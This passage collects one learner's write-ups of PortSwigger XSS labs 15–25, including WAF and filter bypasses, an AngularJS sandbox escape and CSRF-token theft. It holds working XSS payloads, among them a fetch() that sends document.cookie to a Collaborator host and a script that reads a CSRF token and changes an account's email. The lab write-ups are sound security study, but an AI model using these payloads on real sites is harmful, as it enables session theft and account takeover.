(onresize) not blocked by the WAF, then engineered a delivery mechanism
(an iframe that forcibly resizes itself) to reliably trigger that specific
event handler — bypassing the WAF entirely and solving the lab.
What I Learned
This was the most advanced XSS lab completed so far, combining several
skills: automated fuzzing with Burp Intruder to systematically map exactly
what a WAF allows versus blocks (rather than guessing individual payloads
one at a time), understanding that some event handlers (like onresize,
onscroll, onfocus) don't fire automatically on page load and require
specifically engineering a way to trigger the underlying browser event
(here, forcing an iframe resize), and constructing a self-contained
delivery exploit that does all of this automatically the moment a victim
opens the page. This reflects genuinely realistic WAF-bypass methodology:
real-world XSS filter evasion is rarely about finding one clever payload —
it's about systematically testing what a filter actually blocks versus
what it misses, then adapting the exploit to work within those
constraints.



## Lab 15: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

Topic: Cross-Site Scripting (WAF Bypass) | Difficulty: Expert

## Vulnerability
This application's filter blocks every recognized/standard HTML tag
(`img`, `body`, `svg`, `script`, etc.) but does not block **custom,
non-standard tag names** — since these aren't real HTML elements, the
filter's blocklist (built around known tags) simply doesn't recognize them
as dangerous. However, a custom tag has no built-in behavior of its own —
it needs an event handler attribute to actually execute JavaScript, and
that event needs a way to fire automatically without user interaction.

## Steps Taken

### Step 1: Construct the custom tag payload
Built a payload using a fictitious tag name (`xss`, which has no special
meaning in HTML) with an `onfocus` event handler:
<xss id=x onfocus=alert(document.cookie) tabindex=1>
````
- `id=x` gives the element a reference name
- `tabindex=1` makes the otherwise non-interactive custom element
  focusable (custom tags aren't focusable by default, since browsers don't
  know what they are)
- `onfocus=alert(document.cookie)` fires the alert whenever this element
  receives focus
Step 2: Use a URL fragment to auto-trigger focus
Appended #x to the target URL — when a URL fragment matches an
element's id, the browser automatically scrolls to and focuses that
element on page load, without requiring the victim to click, hover, or
interact with the page at all.
Step 3: Build and deliver the exploit
On the exploit server, used a <script> tag to redirect the victim's
browser to a URL containing the encoded payload and the #x fragment:
html<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
Clicked "Store" and "Deliver exploit to victim."
How the Payload Works

The filter only blocks known/standard tag names, so an invented tag like
<xss> passes through completely unfiltered
Since custom tags have no inherent behavior, tabindex=1 is required to
make the element eligible to receive keyboard/programmatic focus at all
The #x URL fragment causes the browser to automatically jump to and
focus the element with id="x" the moment the page finishes loading —
this is standard browser behavior for URL fragments matching element IDs,
not something requiring JavaScript to trigger manually
The moment focus lands on the element, the onfocus handler fires,
executing alert(document.cookie) with zero victim interaction required

Result
Successfully bypassed a tag-name-based filter using a completely
non-standard/custom tag name, combined with a URL fragment trick to
auto-trigger the onfocus event without any user interaction, solving
the lab.
What I Learned
This lab demonstrated that blocklist-based filters targeting known,
"dangerous" tag names have a fundamental blind spot: browsers will still
parse and render any tag name, even ones with no defined meaning
(<xss>, <foo>, etc.) — the browser simply treats them as generic,
unstyled elements. As long as an event handler attribute is attached and
some way exists to trigger that event, the specific tag name used is
irrelevant to actual exploitation. Using a URL fragment (#id) to
auto-focus an element is also a valuable, non-obvious technique for
triggering onfocus-based payloads automatically on page load, without
requiring the victim to click or interact with anything — reinforcing
that many event handlers assumed to require user interaction can actually
be triggered programmatically through browser behaviors like this.



## Lab 16: Reflected XSS with Some SVG Markup Allowed

Topic: Cross-Site Scripting (Filter Bypass) | Difficulty: Practitioner

## Vulnerability
The application's filter blocks common HTML tags typically associated
with XSS (`script`, `img`, `body`, etc.), but does not account for
SVG-specific elements and their associated event attributes — a less
commonly known but fully valid part of HTML/SVG markup.

## Steps Taken

### Step 1: Identify the gap in the filter
Recognized that SVG-related tags and animation elements are often
overlooked by filters designed primarily around standard HTML tags, since
SVG has its own set of elements and event attributes distinct from
regular HTML.

### Step 2: Construct the payload
<svg><animatetransform onbegin=alert(1) attributeName=transform>

## How the Payload Works
- `<svg>` opens an SVG container element — often allowed through filters
  since it's a legitimate, common tag used for vector graphics, not
  typically associated with script execution
- `<animatetransform>` is an SVG animation element, used normally to
  animate properties like position, scale, or rotation over time
- `onbegin` is an event attribute specific to SVG animation elements — it
  fires automatically the moment the animation begins, with no user
  interaction required
- `attributeName=transform` specifies which property the (fake/unused)
  animation targets — required for the element to be valid enough for the
  browser to actually process it and fire the `onbegin` event
- The moment the browser parses and begins processing this animation
  element, `onbegin` fires automatically, executing `alert(1)`

## Result
Successfully bypassed the tag filter using SVG-specific markup and an
SVG-specific event attribute, triggering `alert(1)` automatically on page
load, solving the lab.

## What I Learned
This lab reinforced a recurring theme from Labs 14–15: filters built
around a fixed list of "known dangerous" tags and attributes consistently
miss less mainstream but fully valid parts of the HTML/SVG specification.
SVG in particular has its own rich set of elements and event attributes
(`onbegin`, `onend`, `onrepeat`, etc.) that are frequently absent from
XSS blocklists because they're less commonly seen in typical attacks,
despite being just as capable of executing JavaScript. This further
confirms that blocklist-based filtering is fundamentally difficult to get
right, since it requires anticipating every valid tag/attribute
combination across the entire HTML and SVG specifications — reinforcing
why allowlist-based sanitization (or a strict Content Security Policy) is
a far more robust defense than trying to block "known bad" patterns.




## Lab 17: Reflected XSS in Canonical Link Tag

Topic: Cross-Site Scripting (Attribute Injection) | Difficulty: Expert

## Vulnerability
User input is reflected inside a `<link rel="canonical">` tag on the home
page. Angle brackets are escaped, ruling out any new tag injection.
However, since the reflection point sits inside an existing tag, an
attacker can still inject new *attributes* onto that tag — the same
underlying idea as Lab 7, but applied to a tag type (`link`) that isn't
normally associated with XSS at all.

## Steps Taken

### Step 1: Construct the payload
Since angle brackets were escaped, injected new attributes directly onto
the existing `<link>` tag instead of trying to create a new element:
'accesskey='x'onclick='alert(1)
Visited:
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

### Step 2: Trigger the exploit
Since `accesskey` requires an actual keyboard shortcut to activate (it
doesn't fire automatically), pressed the corresponding key combination for
the browser/OS being used (e.g. `Alt+X` on Linux), which triggered the
injected `onclick` handler.

## How the Payload Works
- The injected `accesskey='x'` attribute defines `X` as a keyboard
  accessibility shortcut for the entire page/element — a legitimate HTML
  feature intended to let users quickly focus/activate an element via the
  keyboard
- `onclick='alert(1)'` is injected as a second new attribute on the same
  tag — this is the actual payload, but it only fires on a click-like
  interaction
- Critically, activating an `accesskey` combination counts as triggering a
  "click" on the associated element, even though no mouse was used — so
  pressing the OS-specific key combination (e.g. `Alt+Shift+X`,
  `Ctrl+Alt+X`, or `Alt+X`) fires the `onclick` handler exactly as if the
  (invisible, non-interactive) `<link>` element had been physically clicked

## Result
Successfully injected `accesskey` and `onclick` attributes onto an
existing `<link>` tag, and triggered `alert(1)` by pressing the
corresponding access-key combination, solving the lab.

## What I Learned
This lab showed that attribute injection (from Lab 7) isn't limited to
"obviously interactive" tags like anchors or images — even a `<link>` tag,
which normally has no visible presence or user interaction at all, can be
turned into a click target using the `accesskey` attribute combined with
an `onclick` handler. This is a good example of abusing a legitimate
accessibility feature for an unintended, malicious purpose — a pattern
worth remembering, since accessibility-related attributes are rarely
considered part of a typical XSS threat model but can still provide a
fully functional interaction trigger. It also reinforced that identifying
*which* tag an injection lands in doesn't limit the attack to that tag's
"expected" behavior — any tag can become interactive if the right
attributes are added.



## Lab 18: Reflected XSS into a JavaScript String with Single Quote and Backslash Escaped

Topic: Cross-Site Scripting (Reflected) | Difficulty: Practitioner

## Vulnerability
The search query tracking functionality reflects input inside a
JavaScript string (similar context to Lab 9), but this time both single
quotes and backslashes are properly escaped — meaning the Lab 9 technique
(`'-alert(1)-'`) would fail here, since the injected `'` would simply be
converted to `\'` and remain part of the string rather than closing it.

## Why the Lab 9 Technique Fails Here
Tested a payload like `test'payload` and confirmed the single quote was
automatically backslash-escaped in the reflected output — properly
preventing the string from being broken out of at the JavaScript-string
level. This meant the vulnerability had to be exploited one level "higher"
than the string itself.

## Steps Taken

### Step 1: Confirm quote escaping is working correctly
Sent `test'payload` and observed the single quote reflected as `\'` in the
response — confirming this specific defense was solid at the string level.

### Step 2: Escape the surrounding script block instead
Replaced the input with:
</script><script>alert(1)</script>

## How the Payload Works
- Rather than trying to break out of the JavaScript *string* (which is
  properly defended), this payload closes the entire enclosing `<script>`
  *tag* first, using `</script>`
- Since the browser's HTML parser processes `</script>` as a real tag
  closure regardless of what's happening inside the JavaScript string at
  that point, this immediately ends the original script block — the
  broken/unclosed string inside it becomes irrelevant, since the browser
  has already stopped treating that content as JavaScript
- `<script>alert(1)</script>` then opens a brand new, completely
  independent script block, containing a clean, valid `alert(1)` call with
  no need to escape any quotes at all

## Result
Successfully bypassed proper string-level escaping by exploiting the HTML
parser's handling of `</script>`, closing the original script block and
starting a fresh one, triggering `alert(1)` and solving the lab.

## What I Learned
This lab was an important reminder that different layers of parsing
happen independently: the browser's HTML parser looks for `<script>` and
`</script>` tags regardless of what's syntactically valid *inside* the
JavaScript at that point — it doesn't care that a string was left open
when it encounters `</script>`. This means that even when input is
correctly escaped for the JavaScript-string context specifically (quotes
and backslashes both handled properly, unlike Lab 9), the injection can
still succeed by escaping at the *HTML* level instead — closing the
entire script element early and starting a fresh one. This reinforces
that XSS defenses must account for every relevant parsing layer (HTML
parsing, then JavaScript parsing within a script block), not just the
specific context the developer had in mind when writing the escaping
logic.



## Lab 19: Reflected XSS into a JavaScript String with Angle Brackets/Double Quotes Encoded and Single Quotes Escaped

Topic: Cross-Site Scripting (Reflected) | Difficulty: Practitioner

## Vulnerability
The search query tracking functionality reflects input inside a
JavaScript string, with three layers of defense in place: angle brackets
are HTML-encoded, double quotes are HTML-encoded, and single quotes are
backslash-escaped. However, backslash characters themselves are not
escaped — the same category of gap seen conceptually in Lab 12 (the
`eval()` JSON lab), but applied directly to a JavaScript string context
here rather than JSON.

## Why Earlier Techniques Don't Work Here
- **Lab 9's technique** (`'-alert(1)-'`) fails because the single quote
  gets backslash-escaped, remaining part of the string instead of closing it
- **Lab 18's technique** (`</script><script>alert(1)</script>`) fails
  because angle brackets are HTML-encoded here, preventing any new tag
  (including a closing `</script>`) from being interpreted as real HTML

## Steps Taken

### Step 1: Confirm single-quote escaping
Sent `test'payload` and confirmed the single quote was escaped to `\'` in
the response — ruling out the direct string-break technique from Lab 9.

### Step 2: Test backslash handling specifically
Sent `test\payload` and observed that the backslash was reflected back
completely unescaped — identifying the same type of gap exploited
conceptually in Lab 12.

### Step 3: Exploit the backslash gap to neutralize the quote escaping
Replaced the input with:
'-alert(1)//

## How the Payload Works
- I supply my own leading backslash (`\`) directly before a single quote
- When the server's filter processes this and escapes the single quote
  (adding its own backslash), the result becomes a double backslash
  followed by a quote (`\\'`)
- A double backslash in a JavaScript string is interpreted as a single,
  literal backslash character — which means the quote immediately
  following it is **no longer treated as escaped** by the JavaScript
  parser; it functions as a real, string-closing quote
- This closes the original JavaScript string exactly where needed
- `-alert(1)` uses the same subtraction-operator technique from Labs 9
  and 12 to insert the function call while keeping the surrounding
  expression syntactically valid
- `//` comments out anything that would have followed on that line,
  preventing a syntax error from the original trailing quote/semicolon

## Result
Successfully used a self-supplied backslash to cancel out the
application's quote-escaping defense, breaking out of the JavaScript
string and triggering `alert(1)`, solving the lab.

## What I Learned
This lab was essentially the same core exploitation logic as Lab 12
(supplying a backslash to consume/neutralize a server's escape character),
but applied to a plain JavaScript string context instead of a JSON
response processed by `eval()`. This reinforced that this backslash-gap
pattern is a general technique, not a one-off trick specific to JSON — any
time a defense escapes a specific character (like a quote) without also
escaping backslash itself, an attacker can supply their own backslash to
neutralize that escaping. Combined with Labs 9, 12, and 18, this lab rounds
out a strong practical understanding of JavaScript-string-context XSS:
direct string-breaking (Lab 9), HTML-parser-level escape (Lab 18), and
escape-character-neutralization (Labs 12 and this lab) now cover the three
main approaches to escaping a JavaScript string context depending on which
specific characters a given defense does or doesn't handle correctly.



## Lab 20: Stored XSS into onclick Event with Angle Brackets/Double Quotes Encoded and Single Quotes/Backslash Escaped

Topic: Cross-Site Scripting (Stored) | Difficulty: Expert

## Vulnerability
The comment functionality's "Website" field is stored and reflected inside
an `onclick` event handler attribute on the comment author's name. This
lab stacks every defense seen so far: angle brackets and double quotes are
HTML-encoded, AND single quotes are backslash-escaped, AND backslash
itself is also properly escaped this time — closing the exact gap that
Lab 19 exploited.

## Why Earlier Techniques Don't Work Here
- **Lab 9/19's techniques** (breaking out with a literal `'`) fail because
  single quotes are escaped
- **Lab 19's backslash-neutralization trick** fails because backslash is
  now also properly escaped, so supplying my own `\` no longer creates an
  exploitable double-backslash

## Steps Taken

### Step 1: Confirm the reflection point
Posted a comment with a random alphanumeric string in the "Website" field,
intercepted both the posting request and the page-viewing request with
Burp Suite, and confirmed the value was reflected inside an `onclick`
attribute on the author name element.

### Step 2: Confirm quote and backslash escaping
Tested payloads containing raw single quotes and backslashes, and
confirmed both were being properly escaped in the output this time —
ruling out both previous bypass techniques.

### Step 3: Use HTML entity encoding instead of literal characters
Replaced the "Website" field value with:
http://foo?&apos;-alert(1)-'

## How the Payload Works
- `&apos;` is the HTML entity representation of a single quote character
- Critically, the application's escaping logic operates on the *literal*
  `'` character in the submitted input — but since I never submit a
  literal quote at all (I submit the harmless entity `&apos;` instead),
  there's nothing for that escaping logic to detect or act on
- However, when the browser parses the final HTML and encounters
  `&apos;` inside the attribute, it decodes this entity back into an
  actual `'` character **before** that attribute value is handed off to
  the JavaScript engine for execution
- This means the quote "reappears" only at the point of browser rendering
  — after the server-side/JavaScript-level escaping has already run and
  found nothing to escape
- Once decoded, the payload behaves exactly like the direct string-break
  technique from Lab 9: the quote closes the attribute's string context,
  `-alert(1)-` uses the subtraction-operator trick to insert the function
  call while keeping the surrounding onclick handler syntactically valid

## Result
Successfully used an HTML entity (`&apos;`) to smuggle a quote character
past both the quote-escaping and backslash-escaping defenses, since
neither ever saw a literal quote to escape — solving the lab when clicking
the comment author's name triggered `alert(1)`.

## What I Learned
This lab exposed a fundamentally different class of gap than Labs 12 and
19: instead of exploiting a flaw in *how* escaping was implemented (like a
missed backslash), this exploited the fact that escaping logic and HTML
entity decoding happen at *different stages* of processing, in a specific
order the defense didn't account for. The server-side escaping only
inspects literal characters in the raw input, but the browser later
decodes HTML entities within an attribute value before that value is used
as JavaScript — meaning any character-based escaping filter can be
bypassed entirely by encoding the dangerous character as an HTML entity
instead of submitting it literally. Combined with Labs 9, 12, 18, and 19,
this rounds out a comprehensive understanding of the many independent
layers (HTML entity decoding, JavaScript string escaping, HTML tag
parsing) that a single XSS defense must correctly handle simultaneously —
missing even one of these layers, as seen across every lab in this
"advanced" cluster, is enough to make the whole defense bypassable.


## Lab 21: Reflected XSS into a Template Literal with Angle Brackets, Quotes, Backslash, and Backticks Escaped

Topic: Cross-Site Scripting (Reflected) | Difficulty: Expert

## Vulnerability
The search blog functionality reflects input inside a JavaScript
**template literal** (a string defined using backticks, e.g.
`` `Results for: USER_INPUT` ``). This defense stacks encoding/escaping
for nearly every character used in previous bypass techniques: angle
brackets and quotes are HTML-encoded, and backticks themselves are
escaped — meaning none of the tag-injection, attribute-breaking, or
string-breaking-via-quote techniques from earlier labs could work here.

## What Makes Template Literals a Distinct Context
Unlike regular JavaScript strings (single/double-quoted, as in Labs 9,
12, 18, 19, 20), template literals have a special built-in feature:
**expression interpolation** using `${ }` syntax. Any valid JavaScript
expression placed inside `${ }` is automatically evaluated by the
JavaScript engine and its result is inserted into the string — this is a
core, intended language feature, not a vulnerability by itself, but it
becomes exploitable the moment attacker-controlled input lands inside an
existing template literal.

## Steps Taken

### Step 1: Confirm the reflection context
Submitted a random alphanumeric string into the search box, intercepted
the request with Burp Suite, and sent it to Repeater. Confirmed the value
was reflected inside a JavaScript template literal (backtick-delimited
string).

### Step 2: Inject a template literal expression
Replaced the input with:
${alert(1)}

### Step 3: Verify the exploit
Copied the resulting URL and loaded it directly in the browser — the page
triggered `alert(1)` automatically on load.

## How the Payload Works
- Since the reflected value lands *inside* an already-open template
  literal, no backtick, quote, or angle bracket needs to be injected or
  escaped at all — the surrounding template literal is never broken out
  of
- `${alert(1)}` is simply valid template literal syntax: the JavaScript
  engine evaluates whatever expression is inside `${ }` and substitutes
  the result into the string
- Because `alert(1)` is a valid JavaScript expression, the engine executes
  it as part of normal string evaluation, with `alert(1)`'s return value
  (which doesn't really matter) being interpolated into the final string

## Result
Successfully executed `alert(1)` using template literal expression
interpolation, without needing to escape or break out of the surrounding
string at all, solving the lab.

## What I Learned
This lab introduced an entirely different exploitation model compared to
every previous JavaScript-string-context lab: instead of trying to escape
*out* of the string (which was thoroughly blocked here — quotes, angle
brackets, backslash, and even backticks were all handled), the attack
worked *within* the string's own syntax, using a legitimate language
feature (`${ }` expression interpolation) that template literals provide
by design. This is an important reminder that as JavaScript itself
gains more expressive syntax (template literals were a relatively newer
addition to the language), new built-in language features can introduce
entirely new injection surfaces that traditional character-escaping
defenses (focused on quotes, brackets, and backslashes) don't anticipate
at all — the vulnerability here isn't a broken escape, but a feature that
inherently evaluates code embedded inside a string.



## Lab 22: Exploiting Cross-Site Scripting to Steal Cookies

Topic: Cross-Site Scripting (Real-World Impact / Session Hijacking) | Difficulty: Practitioner

## Vulnerability
The blog comment functionality contains a stored XSS vulnerability, and a
simulated victim (an admin-level user) automatically views all posted
comments. Unlike every previous lab (which only proved code execution via
`alert()`), this lab required going a full step further: actually stealing
the victim's live session cookie and using it to impersonate them.

## Why This Lab Is Different from Labs 1–21
Every earlier lab used `alert()`, `print()`, or similar functions purely
as a safe proof-of-concept to demonstrate that arbitrary JavaScript
execution was possible. This lab demonstrated the actual real-world
*consequence* of that capability: exfiltrating sensitive data
(`document.cookie`) to an attacker-controlled server and using it to fully
take over another user's authenticated session.

## Steps Taken

### Step 1: Set up an out-of-band listener
Opened Burp Suite Professional's Collaborator tab and generated a unique
Collaborator subdomain/payload to use as a destination for exfiltrated data.

### Step 2: Post a malicious comment
Submitted the following as a blog comment:
```html

fetch('https://[collaborator-subdomain].oastify.com?cookie='+document.cookie);

```

### Step 3: Wait for the victim to view the comment
Since this is a stored XSS vulnerability, the payload executes
automatically for anyone who later views the comments — including the
simulated victim (admin) user, with zero interaction required from them
beyond simply loading the page.

### Step 4: Retrieve the exfiltrated cookie
Returned to the Collaborator tab and clicked "Poll now," revealing an
incoming HTTP interaction — the victim's browser had executed the script
and sent a request containing their session cookie value to the
Collaborator server.

### Step 5: Hijack the victim's session
Reloaded the main blog page, intercepted the request with Burp Proxy/
Repeater, and replaced my own session cookie value with the stolen
victim's cookie value. Sent the modified request.

### Step 6: Confirm full account takeover
Used the same stolen cookie to send a request to `/my-account`,
successfully loading the admin user's account page — proving complete
impersonation of the victim's session.

## How the Payload Works
- `document.cookie` is a standard JavaScript property that returns all
  non-HttpOnly cookies accessible to the current page's script context
- `fetch()` sends an asynchronous HTTP request to a specified URL — here,
  used to silently send the victim's cookie value as a query parameter to
  an external, attacker-controlled server (Burp Collaborator, simulating a
  real attacker's listening server)
- Because this is stored XSS, the script re-executes automatically every
  time any user (including the victim) views the comment, requiring no
  ongoing attacker interaction after the initial post
- Once the victim's session cookie is captured, simply setting that same
  cookie value in a request is sufficient to be treated by the server as
  that authenticated user — since session cookies are typically the sole
  mechanism proving a user is logged in

## Result
Successfully exfiltrated the victim (admin) user's session cookie via
stored XSS and Burp Collaborator, then used that cookie to fully hijack
their session and access their account page, solving the lab.

## What I Learned
This lab connected the entire XSS topic (Labs 1–21) to its actual
real-world security impact: XSS is dangerous not because it can pop up an
alert box, but because it allows an attacker's JavaScript to run with the
same privileges and access as the legitimate page — including reading
cookies, local storage, and making authenticated requests on the victim's
behalf. Session hijacking via stolen cookies is one of the most common
and severe real-world consequences of a stored XSS vulnerability,
especially in an admin-facing context like this one, where a single
successful comment could compromise an administrator's entire account.
This also reinforced the practical value of Burp Collaborator for
out-of-band data exfiltration in a live testing scenario — sending stolen
data to an external listener is exactly how a real attacker would collect
results from a payload deployed against unknown victims. This lab is a
strong, concrete example to discuss in an interview, since it demonstrates
understanding of XSS's actual business impact, not just its mechanics.


## Lab 23: Exploiting Cross-Site Scripting to Capture Passwords

Topic: Cross-Site Scripting (Real-World Impact / Credential Theft) | Difficulty: Practitioner

## Vulnerability
Same stored XSS vulnerability class as Lab 22 (blog comments function,
viewed automatically by a simulated victim), but this time the exploit
goal was to capture the victim's actual login credentials (username and
password) rather than a session cookie — by injecting a fake, invisible
login form directly into the comment.

## Why This Lab Is Different from Lab 22
Lab 22 exfiltrated an existing piece of browser data (`document.cookie`)
that was already present without any user action. This lab instead
required *tricking the victim into providing new input* — injecting fake
form fields that mimic a legitimate login prompt, capturing whatever the
victim types into them, and exfiltrating that captured data the moment
they interact with it.

## Steps Taken

### Step 1: Set up an out-of-band listener
Opened Burp Suite Professional's Collaborator tab and copied a unique
Collaborator payload/subdomain to use as the exfiltration destination.

### Step 2: Post a malicious comment containing a fake login form
Submitted the following as a blog comment:
```html


```

### Step 3: Wait for the victim to interact with the injected fields
Since this is stored XSS, the fake username/password input fields render
automatically for anyone viewing the comments — including the simulated
victim, who (per the lab's design) enters credentials into what appears
to be a normal form field.

### Step 4: Retrieve the exfiltrated credentials
Returned to the Collaborator tab and clicked "Poll now," revealing an
incoming POST request containing the victim's username and password,
concatenated together in the request body.

### Step 5: Log in as the victim
Used the captured username and password to log in directly as the victim
through the normal login page.

## How the Payload Works
- Two new `<input>` elements are injected directly into the page via the
  stored comment — one plain text field for a username, one
  `type=password` field, styled and positioned by the browser exactly
  like a normal, legitimate form field would be
- The password field's `onchange` event handler fires as soon as the
  victim finishes typing into it and moves focus away (e.g., pressing Tab
  or clicking elsewhere) — no explicit "submit" button is even needed
- `if(this.value.length)` ensures the exfiltration only fires if the
  field actually contains a value, avoiding empty/blank submissions
- `fetch(...)` sends a POST request containing `username.value + ':' +
  this.value` (i.e. `username:password`, concatenated) to the attacker's
  Collaborator server
- `mode: 'no-cors'` is used to allow the cross-origin request to be sent
  without being blocked by the browser's CORS policy, even though the
  attacker can't read the *response* — only sending the data out is
  needed, not reading anything back

## Result
Successfully captured the victim's live username and password via a fake,
injected login form, then used those exact credentials to log directly
into the victim's account, solving the lab.

## What I Learned
This lab demonstrated a distinct and arguably more severe consequence of
XSS compared to cookie theft (Lab 22): rather than depending on stealing
an existing session (which might expire or be invalidated), this technique
captures the victim's actual raw credentials, which can then be used to
log in at will, repeatedly, until the victim changes their password.
It also highlighted how convincingly a stored XSS payload can mimic
legitimate page functionality (a normal-looking login/input prompt) since
the injected fields render as real, functional HTML form elements
indistinguishable from genuine ones — this is essentially a phishing
attack delivered directly through a trusted application, which makes it
significantly more convincing than a typical external phishing site,
since the victim never leaves the real, trusted domain. Combined with
Lab 22, this rounds out a clear demonstration of both major real-world
XSS exploitation goals: stealing existing session state (cookies) and
capturing fresh credentials directly from the victim.




## Lab 24: Exploiting XSS to Bypass CSRF Defenses

Topic: Cross-Site Scripting (Chained with CSRF Bypass) | Difficulty: Practitioner

## Vulnerability
The blog comment functionality contains a stored XSS vulnerability. The
user account page has an email-change feature protected by an anti-CSRF
token (a random, unique value in a hidden form field that must be
submitted along with the request, specifically to prevent attackers from
forging this exact kind of request from another site). Normally, this
token defense would make a standard CSRF attack impossible, since an
external attacker's site has no way to read that token value. However,
since XSS runs JavaScript *inside* the trusted, authenticated origin
itself, it can read the token directly, completely sidestepping the CSRF
protection.

## Why CSRF Tokens Don't Stop This Attack
CSRF tokens work by ensuring a request could only have been generated by
a page that was able to *read* the token first — an external attacker
site normally can't fetch and read the account page's HTML due to
same-origin policy. But XSS injects JavaScript that executes *within* the
vulnerable site's own origin, meaning it has exactly the same access as
any legitimate script on that page — including full permission to fetch
the account page and read its CSRF token directly. This demonstrates that
CSRF tokens defend against forged cross-origin requests, but provide no
protection at all once an attacker already has code execution on the
same origin via XSS.

## Steps Taken

### Step 1: Log in and inspect the target functionality
Logged in using the provided credentials (`wiener:peter`) and viewed the
account page's email-change feature. Inspected the page source and
confirmed:
- Changing the email requires a POST request to `/my-account/change-email`
  with an `email` parameter
- The request also requires a valid anti-CSRF token, submitted via a
  hidden `token` input field

### Step 2: Construct a two-stage XSS payload
Submitted the following as a blog comment:
```html

var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};

```

## How the Payload Works
- **Stage 1 — Fetch the account page:** An `XMLHttpRequest` is made to
  `/my-account`, using the victim's own active session (since the request
  is made from within their authenticated browser context, exactly like
  any legitimate request the victim's browser would normally send)
- **Extract the CSRF token:** Once the account page's HTML is returned,
  a regular expression (`name="csrf" value="(\w+)"`) parses out the
  token's actual value directly from the hidden input field in the
  response
- **Stage 2 — Forge the protected request:** A second `XMLHttpRequest`
  sends a POST request to `/my-account/change-email`, this time including
  both the freshly stolen, valid CSRF token and the attacker-chosen new
  email address (`test@test.com`)
- Since the token value is genuine (extracted directly from the victim's
  own valid session, moments earlier), the server has no way to
  distinguish this from a legitimate, victim-initiated request — the CSRF
  defense sees a perfectly valid token and processes the change

### Step 3: Confirm the exploit
The victim's simulated session viewing the comment triggered this entire
sequence automatically, resulting in their account's email being changed
to `test@test.com`, solving the lab.

## Result
Successfully chained a stored XSS vulnerability with a CSRF-token theft
technique to bypass CSRF protection entirely, silently changing the
victim's account email without their knowledge or any visible interaction.

## What I Learned
This lab was a strong example of vulnerability chaining — combining two
separate weaknesses (stored XSS and, indirectly, an over-reliance on
CSRF tokens as a *sole* defense) to achieve something neither
vulnerability alone would allow as cleanly. It reinforced a critical
security principle: CSRF tokens defend specifically against *cross-origin*
forged requests, but they offer zero protection once an attacker has
achieved script execution *within* the same origin via XSS, since the
malicious script can simply read the token like any other legitimate part
of the page. This is a realistic and severe escalation path seen in real
penetration tests — a single stored XSS vulnerability can be leveraged to
defeat other unrelated security controls (CSRF protection, in this case)
that would otherwise seem robust on their own. This also reinforced
practical use of `XMLHttpRequest` for chaining multiple asynchronous
requests together within a single XSS payload — fetching data from one
endpoint, parsing it, and using the extracted value to construct a second,
authenticated request, all automatically and invisibly to the victim.



## Lab 25: Reflected XSS with AngularJS Sandbox Escape Without Strings

Topic: Cross-Site Scripting (Framework Sandbox Escape) | Difficulty: Expert

## Vulnerability
Similar AngularJS `ng-app` context as Lab 11, but this lab imposed two
extra restrictions: the `$eval` function (used in Lab 11's payload) is not
available, and no string literals (quotes) can be used at all in the
payload. AngularJS actually has a built-in "sandbox" specifically designed
to block expressions that try to access dangerous JavaScript constructs
(like `Function` constructors) — Lab 11 exploited an older AngularJS
version where this sandbox was weaker; this lab required a genuine
sandbox *escape* technique on a more hardened version.

## Why No Strings Were Allowed
Normally, XSS payloads (including Lab 11's) rely on string literals (text
inside quotes) to construct malicious code, such as `'alert(1)'` passed to
a constructor. This lab's environment specifically blocked any expression
containing a quote character, meaning any needed "string" first had to be
*constructed* dynamically from non-string values, using only AngularJS/
JavaScript expression syntax.

## The Payload (decoded from URL encoding)
```javascript
toString().constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

## How the Payload Works (step by step)

### Step 1: Create a string without quotes
`toString()` — calling this on an implicit object (like a number) returns
its value *as a string*, entirely without needing to type any quote
characters. This is the core trick used throughout this payload whenever
a string value is needed.

### Step 2: Access the String prototype and JavaScript's Function machinery
`.constructor` — accessed on the string returned by `toString()`, this
retrieves the `String` constructor function itself, which is a gateway to
broader JavaScript internals that AngularJS's sandbox normally tries to
block direct access to.

### Step 3: Break the sandbox by overwriting charAt

.prototype.charAt=[].join;

This deliberately corrupts the built-in `charAt` method that exists on
**every string** in the page, replacing it with the array `join` method
instead. AngularJS's sandbox internally relies on calling `charAt` as part
of its own security checks when evaluating expressions — by overwriting
this function globally, those internal safety checks stop behaving as
expected, effectively breaking the sandbox's ability to properly validate
subsequent expressions.

### Step 4: Use the orderBy filter as an execution vector

[1,2]|orderBy:...

The `orderBy` filter (a built-in AngularJS array-sorting feature) accepts
an expression as its sorting argument. Because the sandbox is now broken
(from Step 3), this argument can contain code that would normally be
blocked.

### Step 5: Build the actual payload string from character codes

toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)

`fromCharCode` builds a string out of individual character codes — each
number corresponds to one character: `120,61,97,...` decodes to the text
`x=alert(1)`. This avoids ever typing the string `alert(1)` directly,
sidestepping the no-quotes restriction entirely while still constructing
that exact executable text.

### Step 6: Execution
With the sandbox's internal checks broken (Step 3) and a constructed
`x=alert(1)` expression passed into the `orderBy` filter (Step 5),
AngularJS evaluates this as a real JavaScript assignment/expression,
executing `alert(1)`.

## Result
Successfully broke AngularJS's expression sandbox by corrupting the
`charAt` prototype method (used internally by the sandbox's own security
checks), then used the `orderBy` filter combined with `fromCharCode` to
construct and execute `alert(1)` — all without using a single quote
character or the `$eval` function, solving the lab.

## What I Learned
This was, by a significant margin, the most advanced lab completed so far.
It went beyond simply finding an unfiltered injection point (Labs 1–24)
into actually defeating a purpose-built security mechanism (AngularJS's
expression sandbox) by corrupting an internal function it silently relies
on. It also demonstrated an important general technique: any time string
literals are blocked, values can often still be constructed dynamically
using method calls like `toString()` and `fromCharCode()`, entirely
avoiding the need for quote characters. This lab is a genuine example of
security research methodology — rather than looking for a known payload,
it required understanding how AngularJS's sandbox validates expressions
internally, finding a function it silently depends on, and deliberately
breaking that dependency to defeat the protection entirely. This is the
kind of technique that shows up in real disclosed AngularJS sandbox-escape
CVEs, not just synthetic lab scenarios.




## Lab 26: Reflected XSS with AngularJS Sandbox Escape and CSP Bypass

